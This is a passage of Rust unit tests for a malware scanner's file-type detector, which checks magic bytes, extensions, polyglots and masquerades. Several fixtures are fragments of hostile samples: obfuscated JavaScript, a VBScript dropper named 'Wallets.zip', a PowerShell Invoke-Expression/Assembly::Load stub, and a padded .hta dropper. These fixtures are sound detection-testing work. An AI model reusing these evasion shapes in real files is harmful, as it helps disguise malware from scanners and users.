        let data = b"name: CI\n\non: [push]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n";
        let det = detect(Path::new("ci.yml"), data).unwrap();
        assert_eq!(det.file_type, FileType::GithubActions);
        assert_eq!(det.source, DetectionSource::Heuristic);
        assert!(!det.extension_mismatch());
    }

    #[test]
    fn github_actions_composite() {
        assert_detect("action.yml", b"name: My Action\n", FileType::GithubActions);
    }

    #[test]
    fn systemd_service() {
        assert_detect(
            "evil.service",
            b"[Unit]\nDescription=Evil\n[Service]\nExecStart=/bin/true\n",
            FileType::SystemdService,
        );
    }

    #[test]
    fn axml_magic_is_xml() {
        let mut doc = vec![0x03, 0x00, 0x08, 0x00, 0, 0, 0, 0, 0x01, 0x00, 0x1c, 0x00];
        let len = u32::try_from(doc.len()).unwrap().to_le_bytes();
        doc[4..8].copy_from_slice(&len);
        assert_detect("res/K1.xml", &doc, FileType::Xml);
        assert_detect("res/K1.bin", &doc, FileType::Xml);
        let mut short = doc.clone();
        short[4] = 0xff;
        // `.bin` is data by extension. A size field that does not cover the
        // buffer must not promote it to XML.
        let det = detect(Path::new("res/K1.bin"), &short).unwrap();
        assert_eq!(det.file_type, FileType::Data);
    }

    #[test]
    fn binary_service_or_desktop_suffix_is_data() {
        // `0x01` keeps the body binary without a lane of NULs, which
        // would otherwise read as UTF-16 text and stay on the extension.
        let mut boot = vec![0x01; 512];
        boot[0] = 0xEA;
        boot[510] = 0x55;
        boot[511] = 0xAA;
        assert_detect("Virus.Boot.Stoned.Service", &boot, FileType::Data);
        assert_detect("payload.desktop", &boot, FileType::Data);
    }

    #[test]
    fn systemd_service_drop_in() {
        assert_ext(
            "/etc/systemd/system/ssh.service.d/override.conf",
            FileType::SystemdService,
        );
    }

    #[test]
    fn pkg_info() {
        assert_detect("PKG-INFO", b"Metadata-Version: 2.1\n", FileType::PkgInfo);
        assert_detect("METADATA", b"Metadata-Version: 2.1\n", FileType::PkgInfo);
    }

    #[test]
    fn arch_package_metadata_files_are_text() {
        assert_detect(".PKGINFO", b"pkgname = wasm-pkg-tools\n", FileType::Text);
        assert_detect(".BUILDINFO", b"format = 2\n", FileType::Text);
        assert_detect(".MTREE", b"#mtree\n", FileType::Text);
    }

    // ── Archives ─────────────────────────────────────────────────────

    #[test]
    fn zip_archive() {
        assert_detect("data.zip", b"PK\x03\x04content", FileType::Zip);
    }

    #[test]
    fn rar_archive() {
        assert_detect("data.rar", b"Rar!\x1a\x07\x01\x00", FileType::Rar);
    }

    #[test]
    fn gzip_archive() {
        assert_detect("data.gz", &[0x1f, 0x8b, 0x08, 0x00], FileType::Gz);
    }

    #[test]
    fn xz_archive() {
        assert_detect("data.xz", b"\xfd7zXZ\x00", FileType::Xz);
    }

    #[test]
    fn bzip2_archive() {
        assert_detect("data.bz2", b"BZh91AY&SY", FileType::Bz2);
    }

    #[test]
    fn dmg_udif_archive() {
        let mut data = vec![0u8; 2048];
        data[63..66].copy_from_slice(b"BZh");
        let trailer = data.len() - 512;
        data[trailer..trailer + 4].copy_from_slice(b"koly");
        data[trailer + 4..trailer + 8].copy_from_slice(&4u32.to_be_bytes());
        data[trailer + 8..trailer + 12].copy_from_slice(&512u32.to_be_bytes());

        assert_detect("data.dmg", &data, FileType::Dmg);
    }

    #[test]
    fn sevenz_archive() {
        assert_detect("data.7z", b"7z\xBC\xAF\x27\x1C\x00", FileType::SevenZ);
    }

    #[test]
    fn zstd_archive() {
        assert_detect("data.zst", &[0x28, 0xB5, 0x2F, 0xFD, 0, 0], FileType::Zst);
    }

    #[test]
    fn freebsd_pkg_zstd_is_not_extension_mismatch() {
        let data = {
            let mut tar = tar::Builder::new(Vec::new());
            let mut h = tar::Header::new_ustar();
            h.set_path("+COMPACT_MANIFEST").unwrap();
            h.set_size(7);
            h.set_cksum();
            tar.append(&h, &b"payload"[..]).unwrap();
            zstd::encode_all(&tar.into_inner().unwrap()[..], 3).unwrap()
        };
        // FreeBSD `.pkg` (zstd tar) now carries its own ecosystem type; the
        // `.pkg`→macOS extension default is a benign refinement, suppressed at
        // the FileId level where consumers read it.
        let id = FileId::from_path_and_bytes(Path::new("BerkeleyGW-4.0_2.pkg"), &data);
        assert_eq!(id.file_type(), FileType::PkgFreebsd);
        assert!(!id.extension_mismatch());
    }

    #[test]
    fn tar_gz_by_ext() {
        assert_ext("data.tar.gz", FileType::TarGz);
        assert_ext("data.tgz", FileType::TarGz);
    }

    #[test]
    fn deb_by_ext() {
        assert_ext("package.deb", FileType::Deb);
    }

    #[test]
    fn gem_by_ext() {
        // A gem is an uncompressed tar with no offset-0 magic, so it resolves
        // through the extension fallback to its own type (not generic Tar).
        assert_ext("rails-7.0.4.gem", FileType::Gem);
    }

    #[test]
    fn specialized_package_extensions() {
        // Void and Gentoo packages resolve through the extension fallback to
        // their own ecosystem types, not generic tar/tar.zst.
        assert_ext("zlib-1.3_1.x86_64.xbps", FileType::Xbps);
        assert_ext("app-1.0-1.gpkg.tar", FileType::GentooBinpkg);
        // The Arch `.pkg.tar.*` family maps to PkgArch by extension.
        assert_ext("foo-1.0-1-x86_64.pkg.tar.zst", FileType::PkgArch);
        assert_ext("foo-1.0-1-x86_64.pkg.tar.xz", FileType::PkgArch);
        assert_ext("foo-1.0-1-x86_64.pkg.tar", FileType::PkgArch);
    }

    #[test]
    fn apk_split_is_not_an_extension_mismatch() {
        // Both `.apk` ecosystems are content-detected away from the extension's
        // zip default, but that disambiguation is benign — not an evasion flag.
        let android = FileId::from_path_and_bytes(Path::new("app.apk"), b"PK\x03\x04zip body");
        assert_eq!(android.file_type(), FileType::ApkAndroid);
        assert!(!android.extension_mismatch());

        let alpine = FileId::from_path_and_bytes(Path::new("musl.apk"), &[0x1f, 0x8b, 0x08, 0x00]);
        assert_eq!(alpine.file_type(), FileType::ApkAlpine);
        assert!(!alpine.extension_mismatch());
    }

    #[test]
    fn package_types_stay_in_archive_group() {
        // Fine-grained package identity must not leak out of the coarse
        // `archive` group that downstream consumers key on.
        for ft in [
            FileType::Gem,
            FileType::ApkAndroid,
            FileType::ApkAlpine,
            FileType::Npm,
            FileType::Crate,
            FileType::Conda,
            FileType::Egg,
            FileType::Nupkg,
            FileType::Ipa,
            FileType::Vsix,
            FileType::PkgMacos,
            FileType::Dmg,
            FileType::PkgFreebsd,
            FileType::PkgArch,
            FileType::PythonSdist,
            FileType::OciImage,
            FileType::Xbps,
            FileType::GentooBinpkg,
        ] {
            assert!(ft.is_archive(), "{ft:?} should be an archive");
            assert_eq!(file_group(ft), "archive", "{ft:?} group");
        }
    }

    #[test]
    fn rpm_by_ext() {
        assert_ext("package.rpm", FileType::Rpm);
    }

    #[test]
    fn is_archive_returns_true_for_archives() {
        assert!(FileType::Zip.is_archive());
        assert!(FileType::TarGz.is_archive());
        assert!(FileType::Rar.is_archive());
        assert!(FileType::SevenZ.is_archive());
        assert!(FileType::Deb.is_archive());
        assert!(FileType::Jar.is_archive());
        assert!(!FileType::Elf.is_archive());
        assert!(!FileType::Python.is_archive());
    }

    #[test]
    fn is_binary_returns_true_for_binaries() {
        assert!(FileType::Elf.is_binary());
        assert!(FileType::Pe.is_binary());
        assert!(FileType::MachO.is_binary());
        assert!(FileType::JavaClass.is_binary());
        assert!(FileType::Dex.is_binary());
        assert!(!FileType::Zip.is_binary());
        assert!(!FileType::Python.is_binary());
    }

    #[test]
    fn is_structured_data_true_for_fully_parsed_manifests() {
        assert!(FileType::PackageJson.is_structured_data());
        assert!(FileType::CargoToml.is_structured_data());
        assert!(FileType::GithubActions.is_structured_data());
        assert!(FileType::Plist.is_structured_data());
        assert!(FileType::SrcInfo.is_structured_data());
        // Generic JSON is size-limited and may fall back to a text scan, so it
        // is deliberately *not* treated as fully-parsed structured data.
        assert!(!FileType::Json.is_structured_data());
        assert!(!FileType::Python.is_structured_data());
        assert!(!FileType::Elf.is_structured_data());
    }

    // ── Documents ────────────────────────────────────────────────────

    #[test]
    fn pdf_magic() {
        assert_detect("doc.pdf", b"%PDF-1.4 content", FileType::Pdf);
    }

    #[test]
    fn pdf_by_ext() {
        assert_ext("doc.pdf", FileType::Pdf);
    }

    #[test]
    fn rtf_magic() {
        assert_detect("doc.rtf", b"{\\rtf1\\ansi content", FileType::Rtf);
    }

    #[test]
    fn ole_doc_magic() {
        let mut data = vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
        data.extend_from_slice(&[0; 100]);
        assert_detect("doc.doc", &data, FileType::OleDoc);
    }

    #[test]
    fn ole_by_ext() {
        assert_ext("file.doc", FileType::OleDoc);
        assert_ext("file.xls", FileType::OleDoc);
        assert_ext("file.ppt", FileType::OleDoc);
        assert_ext("file.msg", FileType::OleDoc);
    }

    #[test]
    fn msi_by_ext_and_magic() {
        assert_ext("setup.msi", FileType::Msi);
        assert_ext("patch.msp", FileType::Msi);
        assert_ext("custom.mst", FileType::Msi);
        assert_ext("merge.msm", FileType::Msi);
        let mut data = vec![0xD0, 0xCF, 0x11, 0xE0, 0xA1, 0xB1, 0x1A, 0xE1];
        data.extend_from_slice(&[0; 100]);
        // Extension gates CFBF: installer family → Msi, .doc → OleDoc, bare → OleDoc.
        assert_detect("setup.msi", &data, FileType::Msi);
        assert_detect("patch.msp", &data, FileType::Msi);
        assert_detect("custom.mst", &data, FileType::Msi);
        assert_detect("merge.msm", &data, FileType::Msi);
        assert_detect("doc.doc", &data, FileType::OleDoc);
        assert_detect("untitled.bin", &data, FileType::OleDoc);
    }

    #[test]
    fn ooxml_by_ext_magic() {
        // The Office extension is honoured only when the bytes back it up.
        // Every OOXML document is an OPC package and names
        // `[Content_Types].xml` as its first entry; a zip that only carries
        // the extension is a zip, and is analyzed as one.
        let opc = b"PK\x03\x04[Content_Types].xml".as_slice();
        assert_detect("report.docx", opc, FileType::Ooxml);
        assert_detect("sheet.xlsx", opc, FileType::Ooxml);
        assert_detect("slides.pptx", opc, FileType::Ooxml);
        assert_detect("report.docx", b"PK\x03\x04office", FileType::Zip);
    }

    #[test]
    fn ooxml_by_ext_only() {
        assert_ext("report.docx", FileType::Ooxml);
        assert_ext("report.docm", FileType::Ooxml);
    }

    // ── Apple formats ────────────────────────────────────────────────

    #[test]
    fn applescript_magic() {
        assert_detect("script.scpt", b"Fasd\x00\x00", FileType::AppleScript);
    }

    #[test]
    fn applescript_by_ext() {
        assert_ext("script.scpt", FileType::AppleScript);
        assert_ext("script.applescript", FileType::AppleScript);
    }

    #[test]
    fn plist_binary() {
        assert_detect("prefs", b"bplist00\x00\x00\x00", FileType::Plist);
    }

    #[test]
    fn plist_xml() {
        assert_detect(
            "Info.plist",
            b"<?xml version=\"1.0\"?>\n<!DOCTYPE plist>",
            FileType::Plist,
        );
    }

    #[test]
    fn interface_builder_sources_are_xml() {
        let xib = b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<document type=\"com.apple.InterfaceBuilder3.Cocoa.XIB\" version=\"3.0\">";
        let det = detect(Path::new("Main.xib"), xib).unwrap();
        assert_eq!(det.file_type, FileType::Xml);
        assert!(!det.extension_mismatch());
        let det = detect(Path::new("Main.storyboard"), xib).unwrap();
        assert_eq!(det.file_type, FileType::Xml);
        assert!(!det.extension_mismatch());
    }

    #[test]
    fn plist_by_ext() {
        assert_ext("prefs.plist", FileType::Plist);
    }

    // ── Images ───────────────────────────────────────────────────────

    #[test]
    fn jpeg_magic() {
        assert_detect(
            "photo.jpg",
            &[0xFF, 0xD8, 0xFF, 0xE0, 0, 0x10],
            FileType::Jpeg,
        );
    }

    #[test]
    fn jpeg_by_ext() {
        assert_ext("photo.jpg", FileType::Jpeg);
        assert_ext("photo.jpeg", FileType::Jpeg);
    }

    #[test]
    fn png_magic() {
        assert_detect(
            "image.png",
            b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR",
            FileType::Png,
        );
    }

    #[test]
    fn riff_form_type_selects_wave_and_leaves_a_cursor_alone() {
        let mut wave = b"RIFF".to_vec();
        wave.extend_from_slice(&16u32.to_le_bytes());
        wave.extend_from_slice(b"WAVE");
        assert_detect("clip.wav", &wave, FileType::Wav);
        let mut webp = b"RIFF".to_vec();
        webp.extend_from_slice(&16u32.to_le_bytes());
        webp.extend_from_slice(b"WEBP");
        assert_detect("pic.webp", &webp, FileType::Webp);
        let mut cursor = b"RIFF".to_vec();
        cursor.extend_from_slice(&16u32.to_le_bytes());
        cursor.extend_from_slice(b"ACON");
        assert!(detect(Path::new("cursor.ani"), &cursor).is_none());
    }

    #[test]
    fn png_by_ext() {
        assert_ext("image.png", FileType::Png);
    }

    #[test]
    fn svg_magic_bare_root() {
        assert_detect(
            "noext",
            b"<svg xmlns=\"http://www.w3.org/2000/svg\">",
            FileType::Svg,
        );
        assert_detect("noext", b"<svg>", FileType::Svg);
    }

    #[test]
    fn svg_magic_with_xml_prolog() {
        // Real-world SVGs frequently lead with an XML prolog (and sometimes a
        // DOCTYPE) before the <svg> root; these must still resolve to Svg, not
        // generic Xml.
        assert_detect(
            "noext",
            b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n<svg xmlns=\"x\"></svg>",
            FileType::Svg,
        );
    }

    #[test]
    fn svg_by_ext() {
        assert_detect(
            "logo.svg",
            b"<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>",
            FileType::Svg,
        );
    }

    #[test]
    fn document_names_do_not_hide_javascript() {
        let js = b"const _0x5789f0=_0x14df;(function(_0x27cbc2){\n\
const fs=require('fs');\nfunction loadAsar(){return require('asar');}\n\
function loadBytenode(){return require('bytenode');}\n})();\n";
        for path in [
            "notes.rst",
            "readme.adoc",
            "app.log",
            "rows.csv",
            "rows.tsv",
            "icon.svg",
        ] {
            assert_detect(path, js, FileType::JavaScript);
        }
        assert_detect(
            "notes.rst",
            b"Title\n=====\n\nJust a paragraph.\n",
            FileType::Text,
        );
        assert_detect("rows.csv", b"name,count\nalice,1\n", FileType::Text);
    }

    #[test]
    fn svg_is_image_group() {
        // SVG belongs to the media (image) group so a binary renamed .svg is a
        // binary→image masquerade, even though its content is scanned as XML.
        assert_eq!(file_group(FileType::Svg), "image");
    }

    #[test]
    fn hta_is_html() {
        // mshta.exe runs an HTML Application as a local-trust program, and the
        // extension went unmapped, so every .hta landed as Unknown -- a type no
        // trait targets, which made this long-standing malware delivery format
        // invisible to rule matching.
        assert_detect(
            "installer.hta",
            b"<html><head><hta:application id=\"a\"/></head><body></body></html>",
            FileType::Html,
        );
    }

    #[test]
    fn front_padded_html_is_still_html() {
        // Observed evasion: an .hta dropper opened with `try {` and ~275 KB of
        // `;` before its first `<html>`, pushing the markup past the old 4 KiB
        // content check. Falling back to Unknown is the worst outcome available
        // -- it matches no trait at all -- so the extension-corroborated check
        // has to see through the padding.
        let mut data = b"try {\n".to_vec();
        data.resize(300 * 1024, b';');
        data.extend_from_slice(b"\n<html><head><title>x</title></head></html>\n} catch(e) {}");
        assert_detect("padded.hta", &data, FileType::Html);
    }

    #[test]
    fn html_page_with_inline_svg_is_html() {
        // An icon in the navigation bar does not make the page an image, and
        // typing it as SVG skips every HTML rule.
        assert_detect(
            "panel.html",
            b"<!DOCTYPE html>\n<html lang=\"en\"><body><nav><svg width=\"20\"></svg></nav>",
            FileType::Html,
        );
    }

    #[test]
    fn xhtml_with_inline_svg_is_not_an_image() {
        // An `<?xml` prolog is allowed before an SVG root, so the doctype
        // check alone does not settle XHTML. An `<html>` element ahead of
        // the `<svg>` does: the svg is a child of the page.
        let data = b"<?xml version=\"1.0\"?>\n<html xmlns=\"x\"><body><svg width=\"9\"></svg>";
        let det = detect(Path::new("page.xhtml"), data).expect("a type");
        assert_ne!(det.file_type, FileType::Svg);
    }

    #[test]
    fn svg_doctype_still_detects_svg() {
        assert_detect(
            "noext",
            b"<!DOCTYPE svg PUBLIC \"-//W3C//DTD SVG 1.1//EN\" \"x\">\n<svg xmlns=\"x\"></svg>",
            FileType::Svg,
        );
    }

    #[test]
    fn xml_prolog_without_svg_stays_xml() {
        assert_detect("noext", b"<?xml version=\"1.0\"?>\n<root/>", FileType::Xml);
    }

    // ── Other formats ────────────────────────────────────────────────

    #[test]
    fn lnk_magic() {
        let mut data = vec![
            0x4C, 0x00, 0x00, 0x00, 0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xC0, 0x00,
            0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
        ];
        data.extend_from_slice(&[0; 100]);
        assert_detect("shortcut.lnk", &data, FileType::Lnk);
    }

    #[test]
    fn lnk_by_ext() {
        assert_ext("shortcut.lnk", FileType::Lnk);
    }

    #[test]
    fn chm_magic() {
        // ITSF header: ITSF + version=3 + header_len + 1 + timestamp + lcid
        let mut data = b"ITSF".to_vec();
        data.extend_from_slice(&3u32.to_le_bytes()); // version
        data.extend_from_slice(&[0u8; 24]); // padding
        assert_detect("help.chm", &data, FileType::Chm);
    }

    #[test]
    fn chm_by_ext() {
        assert_ext("help.chm", FileType::Chm);
    }

    #[test]
    fn pickle_magic() {
        assert_detect("model.pkl", &[0x80, 0x04, 0x95, 0x00], FileType::Pickle);
    }

    #[test]
    fn pickle_by_ext() {
        assert_ext("model.pkl", FileType::Pickle);
        assert_ext("data.pickle", FileType::Pickle);
    }

    #[test]
    fn html_with_content() {
        assert_detect(
            "page.html",
            b"<!DOCTYPE html><html><body>hi</body></html>",
            FileType::Html,
        );
    }

    #[test]
    fn html_without_content_skipped() {
        // .html extension but no HTML tags → skip
        assert!(detect(Path::new("page.html"), b"just plain text").is_none());
    }

    #[test]
    fn extensionless_php_html_fragment_detects_as_php() {
        let data = br#"/**
** Filters for Special Mail Tags
**/

add_filter( 'wpcf7_special_mail_tags', 'wpcf7_special_mail_tag', 10, 3 );

function wpcf7_special_mail_tag( $output, $name, $html ) {
    if ( '_remote_ip' == $name )
        $output = preg_replace( '/[^0-9a-f.:, ]/', '', $_SERVER['REMOTE_ADDR'] );
    elseif ( '_user_agent' == $name )
        $output = substr( $_SERVER['HTTP_USER_AGENT'], 0, 254 );
}
?>
<!DOCTYPE html><html><head><script>var x = 1;</script></head></html>
"#;
        let det = detect(Path::new("wordpress-cache-fragment"), data)
            .expect("expected PHP heuristic detection");
        assert_eq!(det.file_type, FileType::Php);
        assert_eq!(det.source, DetectionSource::Heuristic);
    }

    #[test]
    fn markdown_by_ext() {
        assert_ext("readme.md", FileType::Markdown);
        assert_ext("notes.markdown", FileType::Markdown);
    }

    #[test]
    fn makefile_path_only_detection() {
        assert_detect("Makefile", b"all:\n\techo hi\n", FileType::Makefile);
        assert_detect("Makefile.debug", b"all:\n\techo hi\n", FileType::Makefile);
        assert_detect("rules.mk", b"all:\n\techo hi\n", FileType::Makefile);
        assert!(detect(Path::new("buildfile"), b"all:\n\techo hi\n").is_none());
    }

    // ── Skip / non-match ─────────────────────────────────────────────

    #[test]
    fn unknown_binary_returns_none() {
        // `.bin` now classifies as `Data` (see ext.rs), so use an
        // unregistered extension + unrecognised magic to exercise the
        // "truly unknown" path.
        let got = detect(Path::new("data.blob"), b"\x00\x00\x00\x00");
        assert!(
            got.is_none(),
            "expected None for unknown content, got {got:?}"
        );
    }

    #[test]
    fn magic_less_types_survive_a_wrapper_suffix() {
        // A quarantined or backed-up config has no signature in its bytes, so
        // the extension under the wrapper is the only evidence there is. Before
        // this, only source code was read out from under a wrapper and these
        // typed as unknown — meaning cleave skipped them and no rule ran.
        let yaml = b"apiVersion: v1\nkind: Pod\nmetadata:\n  name: x\n";
        let json = b"{\n  \"name\": \"x\"\n}\n";
        assert_detect("deploy.yaml.quarantine", yaml, FileType::Yaml);
        assert_detect("cfg.yaml.bak", yaml, FileType::Yaml);
        assert_detect("package.json.bak", json, FileType::Json);
        assert_detect("index.js.bak", b"const a = 1;\n", FileType::JavaScript);
        // Binaries and archives are NOT typed from a name under a wrapper —
        // their magic is authoritative, so a renamed payload cannot claim a
        // type its bytes do not support.
        assert!(
            detect_path(Path::new("note.so.old")).is_none(),
            "a binary must not be typed from its name under a wrapper"
        );
        assert!(detect_path(Path::new("app.tar.gz.bak")).is_none());
    }

    #[test]
    fn version_suffix_is_not_an_unknown_extension() {
        // Registry artifacts are stored as `<name>@<semver>` with no suffix.
        // `Path::extension` splits on the last dot and reports "0"/"25", which
        // was being read as an unrecognized extension — making every ordinary
        // npm/crate/gem tarball an `archive_as_unknown` masquerade signal.
        let gz = b"\x1f\x8b\x08\x00\x00\x00\x00\x00\x00\x03";
        for name in [
            "keyvault-keys@4.8.0",
            "cranelift-native@0.118.0",
            "react-redux@7.1.25",
            "jsonpointer@v0.21.1",
            "python3.11",
        ] {
            let det = detect(Path::new(name), gz).unwrap();
            assert!(
                !det.extension_mismatch(),
                "{name} reported an extension mismatch on a version suffix"
            );
        }
        // A named extension still counts, in both directions.
        assert!(
            !detect(Path::new("pkg-1.2.3.tgz"), gz)
                .unwrap()
                .extension_mismatch()
        );
        assert!(
            detect(Path::new("photo.png"), gz)
                .unwrap()
                .extension_mismatch(),
            "a real extension disagreeing with content is still a mismatch"
        );
    }

    // ── Formats added from the gauntlet good-cohort "unknown" bucket ──
    // Every case below is a real artifact that atomscan could not identify.

    /// A SquashFS superblock: `hsqs` magic, then the 4.0 header fields.
    fn squashfs_superblock() -> Vec<u8> {
        let mut v = b"hsqs".to_vec();
        // inodes, mkfs_time, block_size, fragments, compression, block_log,
        // flags, ids, s_major(4), s_minor(0).
        v.extend_from_slice(&10u32.to_le_bytes());
        v.extend_from_slice(&0u32.to_le_bytes());
        v.extend_from_slice(&131_072u32.to_le_bytes());
        v.extend_from_slice(&1u32.to_le_bytes());
        for field in [1u16, 17, 0, 0, 4, 0] {
            v.extend_from_slice(&field.to_le_bytes());
        }
        v.resize(256, 0);
        v
    }

    #[test]
    fn snap_is_squashfs_named_by_extension() {
        // binwalk-ng_5.snap — a SquashFS image. The magic gives the filesystem;
        // only the extension says it is a Snap package.
        assert_detect("binwalk-ng_5.snap", &squashfs_superblock(), FileType::Snap);
        assert_detect(
            "firmware.squashfs",
            &squashfs_superblock(),
            FileType::SquashFs,
        );
        // Big-endian superblocks are the same filesystem.
        let mut be = squashfs_superblock();
        be[..4].copy_from_slice(b"sqsh");
        assert_detect("rootfs.bin", &be, FileType::SquashFs);
    }

    #[test]
    fn snap_extension_without_readable_body() {
        // The draw hands us truncated or streamed artifacts too; the extension
        // still names them.
        assert_ext("binwalk-ng_5.snap", FileType::Snap);
    }

    #[test]
    fn flatpak_is_extension_only() {
        // Beekeeper-Studio-5.9.3-aarch64.flatpak — an OSTree static delta in
        // GVariant framing, with no magic at a fixed offset to key on.
        assert_ext("Beekeeper-Studio-5.9.3-aarch64.flatpak", FileType::Flatpak);
    }

    #[test]
    fn pgp_signature_armored_and_by_extension() {
        // OpenJDK21U-testimage_x64_mac_hotspot_21.0.12_8.tar.gz.sig — the `.sig`
        // suffix follows a `.tar.gz`, so it must beat the archive fallbacks.
        assert_ext(
            "OpenJDK21U-testimage_x64_mac_hotspot_21.0.12_8.tar.gz.sig",
            FileType::PgpSignature,
        );
        assert_detect(
            "release.asc",
            b"-----BEGIN PGP SIGNATURE-----\n\niQIzBAAB\n",
            FileType::PgpSignature,
        );
    }

    #[test]
    fn checksum_manifest_is_text() {
        // libdenort-x86_64-pc-windows-msvc.zip.sha256sum — the `.zip` in the
        // middle of the name must not win.
        assert_ext(
            "libdenort-x86_64-pc-windows-msvc.zip.sha256sum",
            FileType::Text,
        );
        assert_ext("SHASUMS256.txt", FileType::Text);
    }

    #[test]
    fn generic_yaml_is_typed() {
        // hle.yaml / config.yaml / gpqa.yaml from HuggingFace model repos.
        assert_ext("hle.yaml", FileType::Yaml);
        assert_ext("config.yml", FileType::Yaml);
    }

    #[test]
    fn yaml_dialects_are_not_extension_mismatches() {
        // A workflow is YAML: refining `.yml` to GithubActions is agreement
        // about one file, not a masquerade. Regression guard — typing `.yml`
        // as Yaml made every workflow file look like a mismatch.
        let data = b"name: CI\n\non: [push]\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n";
        let det = detect(Path::new("ci.yml"), data).unwrap();
        assert_eq!(det.file_type, FileType::GithubActions);
        assert!(!det.extension_mismatch());
        let det = detect(Path::new("pnpm-lock.yaml"), b"lockfileVersion: 9\n").unwrap();
        assert!(!det.extension_mismatch());
    }

    #[test]
    fn new_types_round_trip_through_labels() {
        for ft in [
            FileType::Yaml,
            FileType::Snap,
            FileType::Flatpak,
            FileType::SquashFs,
            FileType::PgpSignature,
        ] {
            assert_eq!(FileType::from_label(ft.label()), Some(ft), "{ft:?}");
        }
    }

    #[test]
    fn yaml_not_misclassified() {
        // A plain YAML config is Yaml — not the language whose keywords its
        // values happen to contain, and no longer an unknown. `on: push` is
        // deliberately workflow-shaped: the GitHub Actions refinement needs a
        // `jobs:` key too, so this must stay generic.
        let det = detect(Path::new("config.yaml"), b"name: test\non: push\n").unwrap();
        assert_eq!(det.file_type, FileType::Yaml);
        assert!(!det.extension_mismatch());
    }

    #[test]
    fn json_data_detects_as_generic_json() {
        let det = detect(Path::new("data.json"), b"{\"key\": \"value\"}").unwrap();
        assert_eq!(det.file_type, FileType::Json);
        assert!(det.file_type.is_program());
    }

    #[test]
    fn txt_detects_as_text() {
        assert_detect("notes.txt", b"some text here", FileType::Text);
    }

    #[test]
    fn source_map_sidecars_detect_as_data() {
        assert_ext("package/parse.ts.map", FileType::Data);
        assert_ext("bundle.map", FileType::Data);
    }

    #[test]
    fn m4_macro_detects_as_text() {
        assert_detect(
            "build-to-host.m4",
            b"AC_DEFUN([gl_BUILD_TO_HOST], [AC_SUBST([$1])])\n",
            FileType::Text,
        );
    }

    #[test]
    fn raw_lzma_extension_detects_as_lzma() {
        assert_detect(
            "fixture.lzma",
            b"\x5d\x00\x00\x80\x00\xff\xff\xff\xff\xff\xff\xff\xff",
            FileType::Lzma,
        );
    }

    #[test]
    fn asar_detects_as_archive() {
        assert_detect(
            "app.asar",
            b"\x04\x00\x00\x00\x20\x00\x00\x00\x1c\x00\x00\x00\x18\x00\x00\x00{\"files\":{}}",
            FileType::Asar,
        );
        assert!(FileType::Asar.is_archive());
    }

    // ── API: detect_content / detect_path ────────────────────────────

    #[test]
    fn detect_content_only() {
        let det = detect_content(b"\x89PNG\r\n\x1a\n\x00\x00\x00\rIHDR").unwrap();
        assert_eq!(det.file_type, FileType::Png);
    }

    #[test]
    fn detect_path_only() {
        let det = detect_path(Path::new("app.js")).unwrap();
        assert_eq!(det.file_type, FileType::JavaScript);
    }

    // ── Filename-detected types inside temp directories ──────────────

    /// Filename-detected types (package.json, Cargo.toml, etc.) must be
    /// recognized when the file sits inside a temp directory, which is how
    /// the HTTP upload handlers preserve the original name.
    #[test]
    fn license_in_temp_dir_detected_as_text() {
        let data = include_bytes!("testdata/LICENSE");
        let det = detect(Path::new("/tmp/fn-list/LICENSE"), data).unwrap();
        assert_eq!(det.file_type, FileType::Text);
        assert_eq!(det.source, DetectionSource::Filename);
    }

    // ── Content-first detection beats extension-only fallback ────────

    /// Real-world polyglot: a `.zip` file whose first KB is a VBScript
    /// payload (CHM/EOCD-comment dropper). Trusting the `.zip` extension
    /// would route to the ZIP analyzer and fail outright; the heuristic
    /// must take precedence so the script content gets analyzed and the
    /// extension/content mismatch surfaces.
    #[test]
    fn polyglot_zip_extension_with_vbscript_body_detected_as_vbs() {
        let body = b"On Error Resume Next\r\n\
            Dim S1, FSO, Shell\r\n\
            Set FSO = CreateObject(\"Scripting.FileSystemObject\")\r\n\
            Set Shell = CreateObject(\"WScript.Shell\")\r\n\
            Set S1 = CreateObject(\"ADODB.Stream\")\r\n";
        let det = detect(Path::new("Wallets.zip"), body).unwrap();
        assert_eq!(det.file_type, FileType::Vbs);
        assert_eq!(det.source, DetectionSource::Heuristic);
        // The mismatch must be visible to callers (cleave reports it as a
        // suspicious "extension says X but content is Y" finding).
        assert!(det.extension_mismatch());
        assert_eq!(det.extension_type(), Some(FileType::Zip));
    }

    /// Same idea, but with PowerShell content under a `.zip` extension —
    /// covers the `.NET reflection AMSI bypass` shape we sometimes see
    /// dropped under decoy archive names.
    #[test]
    fn polyglot_zip_extension_with_powershell_body_detected_as_ps1() {
        let body = b"$ErrorActionPreference = 'SilentlyContinue'\n\
            Invoke-Expression $payload\n\
            [Reflection.Assembly]::Load($bytes)\n";
        let det = detect(Path::new("update.zip"), body).unwrap();
        assert_eq!(det.file_type, FileType::PowerShell);
        assert!(det.extension_mismatch());
    }

    /// Negative: a real ZIP (PK magic) under `.zip` must still resolve
    /// via magic detection, *not* via heuristics — even if the archive
    /// happens to embed text that resembles script keywords later in the
    /// file. Heuristics scan only the first few KB so PK at offset 0
    /// short-circuits cleanly.
    #[test]
    fn real_zip_still_detected_by_magic_not_heuristics() {
        let mut data = b"PK\x03\x04".to_vec();
        // Append some script-like text that *would* trigger heuristics if
        // we ever reached them.
        data.extend_from_slice(b"WScript.Shell CreateObject Option Explicit");
        let det = detect(Path::new("real.zip"), &data).unwrap();
        assert_eq!(det.file_type, FileType::Zip);
        assert_eq!(det.source, DetectionSource::Magic);
        assert!(!det.extension_mismatch());
    }

    #[test]
    fn source_extension_beats_weak_language_heuristics() {
        let go = b"package main\n\nimport \"log/slog\"\n\nfunc main() { slog.Info(\"ok\") }\n";
        let det = detect(Path::new("main.go"), go).unwrap();
        assert_eq!(det.file_type, FileType::Go);
        assert_eq!(det.source, DetectionSource::Extension);
        assert!(!det.extension_mismatch());

        let js = b"const fs = require('fs');\nvar x = 1;\nmodule.exports = x;\n";
        let det = detect(Path::new("index.js"), js).unwrap();
        assert_eq!(det.file_type, FileType::JavaScript);
        assert_eq!(det.source, DetectionSource::Extension);
        assert!(!det.extension_mismatch());
    }

    #[test]
